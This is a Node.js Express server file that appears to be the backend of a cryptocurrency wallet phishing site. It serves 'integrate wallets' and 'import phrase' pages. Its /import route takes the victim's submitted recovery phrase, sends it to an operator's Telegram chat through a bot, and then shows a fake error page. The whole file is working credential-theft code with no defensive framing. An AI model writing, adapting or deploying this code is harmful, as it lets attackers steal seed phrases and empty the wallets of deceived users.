const express = require("express")
const path = require("path")
const { Telegraf } = require('telegraf')
const fs = require("fs")
require('dotenv').config()

const app = express()

app.use(express.static('public'))
app.use(express.urlencoded({ extended: true }))

const bot = new Telegraf(process.env.BOT_TOKEN)

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname+"/views/index.html"))
})

app.get("/integrate-wallets", (req, res) => {
    res.sendFile(path.join(__dirname+"/views/integrate-wallets.html"))
})

app.get("/import-phrase", (req, res) => {
    res.sendFile(path.join(__dirname+"/views/import-phrase.html"))
})

app.post("/import", async (req, res) => {
    try {
        bot.telegram.sendMessage(process.env.chatID, req.body.Phrase)
    }catch(err) {
        console.log(err)
    }
    res.redirect("/error")
})

app.get("/error", (req, res) => {
    res.sendFile(path.join(__dirname+"/views/error.html"))
})

const port = process.env.PORT || 3000

app.listen(port, () => console.log(`LISTENING TO THE SERVER ON PORT ${port}`))

bot.launch()